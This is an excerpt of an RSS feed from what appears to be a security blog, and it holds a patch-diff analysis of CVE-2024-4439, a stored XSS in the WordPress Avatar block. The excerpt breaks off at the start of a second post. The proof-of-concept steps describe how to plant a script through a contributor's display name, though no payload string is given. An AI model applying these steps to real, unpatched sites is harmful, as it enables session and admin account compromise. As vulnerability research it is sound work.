Cross-Site Scripting&lt;/strong&gt; via the user&amp;rsquo;s display name in the &lt;strong&gt;Avatar block&lt;/strong&gt; in multiple versions &lt;strong&gt;up to 6.5.2&lt;/strong&gt; due to &lt;strong&gt;insufficient output escaping&lt;/strong&gt; of the &lt;strong&gt;display name&lt;/strong&gt;. This allows &lt;strong&gt;authenticated attackers&lt;/strong&gt; with &lt;strong&gt;contributor-level access&lt;/strong&gt; or higher to &lt;strong&gt;inject arbitrary web scripts&lt;/strong&gt; into pages — those scripts will &lt;strong&gt;execute&lt;/strong&gt; whenever a user visits the page containing the injection. Additionally, it allows &lt;strong&gt;unauthenticated attackers&lt;/strong&gt; to &lt;strong&gt;inject arbitrary web scripts&lt;/strong&gt; into pages that contain a &lt;strong&gt;comment block&lt;/strong&gt; showing the &lt;strong&gt;comment author&amp;rsquo;s avatar&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2024-4439&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2024-4439&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Cross Site Scripting (XSS)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;6.0 - 6.0.7&lt;/li&gt;&#xA;&lt;li&gt;6.1 - 6.1.5&lt;/li&gt;&#xA;&lt;li&gt;6.2 - 6.2.4&lt;/li&gt;&#xA;&lt;li&gt;6.3 - 6.3.3&lt;/li&gt;&#xA;&lt;li&gt;6.4 - 6.4.3&lt;/li&gt;&#xA;&lt;li&gt;6.5 - 6.5.1&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;6.0.8&lt;/li&gt;&#xA;&lt;li&gt;6.1.6&lt;/li&gt;&#xA;&lt;li&gt;6.2.5&lt;/li&gt;&#xA;&lt;li&gt;6.3.4&lt;/li&gt;&#xA;&lt;li&gt;6.4.4&lt;/li&gt;&#xA;&lt;li&gt;6.5.2&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: 7.2 (High)&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor+&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress&lt;/a&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Core versions&lt;/strong&gt;: &lt;strong&gt;6.4.3&lt;/strong&gt; (vulnerable) and &lt;strong&gt;6.4.4&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff/comparison tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;In the &lt;strong&gt;vulnerable&lt;/strong&gt; version, WP Core used &lt;a href=&#34;https://developer.wordpress.org/reference/functions/esc_attr__/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;esc_attr__()&lt;/code&gt;&lt;/a&gt; to translate the string and escape an HTML attribute before outputting to the browser, but it was implemented incorrectly.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$label = &amp;#39;aria-label=&amp;#34;&amp;#39; . sprintf( esc_attr__( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) . &amp;#39;&amp;#34;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here &lt;code&gt;esc_attr__()&lt;/code&gt; translates and escapes the HTML before being passed to &lt;code&gt;sprintf()&lt;/code&gt; to inject &lt;code&gt;$author_name&lt;/code&gt; — therefore &lt;code&gt;$author_name&lt;/code&gt; is not escaped.&lt;/p&gt;&#xA;&lt;p&gt;In the &lt;strong&gt;patched&lt;/strong&gt; version, &lt;code&gt;$author_name&lt;/code&gt; is passed into &lt;code&gt;sprintf()&lt;/code&gt; first and then the full string is escaped with &lt;code&gt;esc_attr()&lt;/code&gt;, which is safe against XSS.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$label = &amp;#39;aria-label=&amp;#34;&amp;#39; . esc_attr( sprintf( __( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) ) . &amp;#39;&amp;#34;&amp;#39;;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/dif1.png&#39; alt=&#34;Comparison between the vulnerable and patched versions&#34; height=&#34;223&#34; width=&#34;1769&#34;&gt;&#xA;&lt;em&gt;Comparison between the vulnerable and patched versions&lt;/em&gt;&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;function render_block_core_avatar( $attributes, $content, $block ) {&#xA;  // other logic&#xA;  if ( ! isset( $block-&amp;gt;context[&amp;#39;commentId&amp;#39;] ) ) {&#xA;    $author_id   = isset( $attributes[&amp;#39;userId&amp;#39;] ) ? $attributes[&amp;#39;userId&amp;#39;] : get_post_field( &amp;#39;post_author&amp;#39;, $block-&amp;gt;context[&amp;#39;postId&amp;#39;] );&#xA;    $author_name = get_the_author_meta( &amp;#39;display_name&amp;#39;, $author_id );&#xA;    // other logic&#xA;    if ( isset( $attributes[&amp;#39;isLink&amp;#39;] ) &amp;amp;&amp;amp; $attributes[&amp;#39;isLink&amp;#39;] ) {&#xA;      $label = &amp;#39;&amp;#39;;&#xA;      if ( &amp;#39;_blank&amp;#39; === $attributes[&amp;#39;linkTarget&amp;#39;] ) {&#xA;        // translators: %s is the Author name.&#xA;        $label = &amp;#39;aria-label=&amp;#34;&amp;#39; . sprintf( esc_attr__( &amp;#39;(%s author archive, opens in a new tab)&amp;#39; ), $author_name ) . &amp;#39;&amp;#34;&amp;#39;;&#xA;      }&#xA;    }&#xA;  }&#xA;  // other logic&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;strong&gt;Avatar block&lt;/strong&gt; is a Block Editor block used to render post or comment content in WordPress.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$author_name&lt;/code&gt; is the &lt;code&gt;display_name&lt;/code&gt; of the author with &lt;code&gt;$author_id&lt;/code&gt; belonging to the current post.&lt;/p&gt;&#xA;&lt;p&gt;If this is a post and the link option is enabled, the &lt;code&gt;$author_name&lt;/code&gt; containing a payload will be added to the &lt;code&gt;aria-label&lt;/code&gt; attribute and output to the browser.&lt;/p&gt;&#xA;&lt;p&gt;When visiting any post, &lt;code&gt;wp()&lt;/code&gt; is called to load that post’s data.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug1.png&#39; alt=&#34;Where post data for the current post starts being fetched&#34; height=&#34;477&#34; width=&#34;982&#34;&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function wp( $query_vars = &amp;#39;&amp;#39; ) {&#xA;&#x9;global $wp, $wp_query, $wp_the_query;&#xA;&#xA;&#x9;$wp-&amp;gt;main( $query_vars );&#xA;&#xA;&#x9;if ( ! isset( $wp_the_query ) ) {&#xA;&#x9;&#x9;$wp_the_query = $wp_query;&#xA;&#x9;}&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Here &lt;code&gt;$wp_query&lt;/code&gt; is created and will contain the &lt;code&gt;wp_post&lt;/code&gt; values after the query.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function main( $query_args = &amp;#39;&amp;#39; ) {&#xA;  $this-&amp;gt;init();&#xA;&#xA;  $parsed = $this-&amp;gt;parse_request( $query_args );&#xA;&#xA;  if ( $parsed ) {&#xA;    $this-&amp;gt;query_posts();&#xA;    $this-&amp;gt;handle_404();&#xA;    $this-&amp;gt;register_globals();&#xA;  }&#xA;&#xA;  $this-&amp;gt;send_headers();&#xA;&#xA;  do_action_ref_array( &amp;#39;wp&amp;#39;, array( &amp;amp;$this ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;main()&lt;/code&gt; will &lt;code&gt;parse_request&lt;/code&gt; and perform the query to fetch the current post information using &lt;code&gt;query_posts()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug2.png&#39; alt=&#34;Fetching the post using query\_posts()&#34; height=&#34;522&#34; width=&#34;1513&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;$wp_the_query&lt;/code&gt; is the &lt;strong&gt;main WP_Query&lt;/strong&gt; object in WordPress, while &lt;code&gt;$wp_query&lt;/code&gt; is simply a &lt;strong&gt;reference&lt;/strong&gt; pointing to &lt;code&gt;$wp_the_query&lt;/code&gt;. Therefore, when &lt;code&gt;$wp_the_query&lt;/code&gt; is initialized and has data, &lt;code&gt;$wp_query&lt;/code&gt; will have the same data.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/debug3.png&#39; alt=&#34;Reference value of $wp\_query&#34; height=&#34;473&#34; width=&#34;1338&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;We obtain the &lt;code&gt;post_content&lt;/code&gt; value:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!-- wp:avatar {&amp;#34;userId&amp;#34;:2,&amp;#34;isLink&amp;#34;:true,&amp;#34;linkTarget&amp;#34;:&amp;#34;_blank&amp;#34;} /--&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp:avatar&lt;/code&gt; is the &lt;code&gt;core/avatar&lt;/code&gt; block type.&lt;/p&gt;&#xA;&lt;p&gt;The &lt;code&gt;render()&lt;/code&gt; function will call &lt;code&gt;call_user_func()&lt;/code&gt; with the callback &lt;code&gt;render_block_core_avatar()&lt;/code&gt; to get the Avatar block HTML and return it to the user.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;sources--sinks&#34;&gt;&lt;span&gt;Sources &amp;amp; Sinks&lt;/span&gt;&#xA;  &lt;a href=&#34;#sources--sinks&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Source&lt;/strong&gt;: author name of a contributor+&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Sink&lt;/strong&gt;: &lt;code&gt;$author_name&lt;/code&gt; injected into the &lt;code&gt;aria-label&lt;/code&gt; attribute&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;Create a post account with role &lt;code&gt;contributor+&lt;/code&gt; containing an avatar block, enable the &lt;strong&gt;Link to user profile&lt;/strong&gt; option and select the contributor user.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/post1.png&#39; alt=&#34;Create a post with link to user profile enabled&#34; height=&#34;422&#34; width=&#34;1468&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Change the first name to contain an XSS payload and set the display name to the first name.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/disname.png&#39; alt=&#34;Select a display name containing an XSS payload&#34; height=&#34;244&#34; width=&#34;603&#34;&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Admin previews the post =&amp;gt; XSS occurs&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-10-09-cve-2024-4439/xss1.png&#39; alt=&#34;XSS occurs when admin previews the post&#34; height=&#34;588&#34; width=&#34;1385&#34;&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;CVE-2024-4439&lt;/strong&gt; vulnerability in &lt;strong&gt;WordPress Core &amp;lt;= 6.5.1&lt;/strong&gt; stems from incorrect use of the &lt;code&gt;esc_attr__()&lt;/code&gt; function when handling &lt;code&gt;display_name&lt;/code&gt; in the &lt;strong&gt;Avatar block&lt;/strong&gt;, resulting in a &lt;strong&gt;Stored XSS&lt;/strong&gt;. An attacker can exploit this by inserting a payload in the &lt;code&gt;display_name&lt;/code&gt;, causing malicious scripts to execute when users (including admins) visit a page containing the block. The patch in &lt;strong&gt;6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2&lt;/strong&gt; changes the handling — escaping after formatting with &lt;code&gt;sprintf()&lt;/code&gt; — ensuring the data is safe before rendering to the browser.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Key takeaways&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Escape order matters&lt;/strong&gt;: data should be &lt;strong&gt;formatted first&lt;/strong&gt;, then &lt;strong&gt;escaped&lt;/strong&gt; to avoid introducing XSS.&lt;/li&gt;&#xA;&lt;li&gt;Even &lt;strong&gt;core functions&lt;/strong&gt; like &lt;code&gt;esc_attr__()&lt;/code&gt; can lead to serious vulnerabilities if used incorrectly.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Stored XSS&lt;/strong&gt; is particularly dangerous because it persists in the database and can trigger whenever a user views the affected content.&lt;/li&gt;&#xA;&lt;li&gt;Not only plugins/themes, but &lt;strong&gt;WordPress Core&lt;/strong&gt; must be &lt;strong&gt;updated regularly&lt;/strong&gt; to reduce security risk.&lt;/li&gt;&#xA;&lt;li&gt;Analyzing &lt;strong&gt;patch diffs&lt;/strong&gt; is an effective way to learn secure coding practices and understand the root cause of bugs.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://portswigger.net/web-security/cross-site-scripting/cheat-sheet&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Cross-site scripting (XSS) cheat sheet — PortSwigger&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9816 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-08-cve-2025-9816/</link>
      <pubDate>Wed, 08 Oct 2025 17:57:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-08-cve-2025-9816/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-08-cve-2025-9816/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 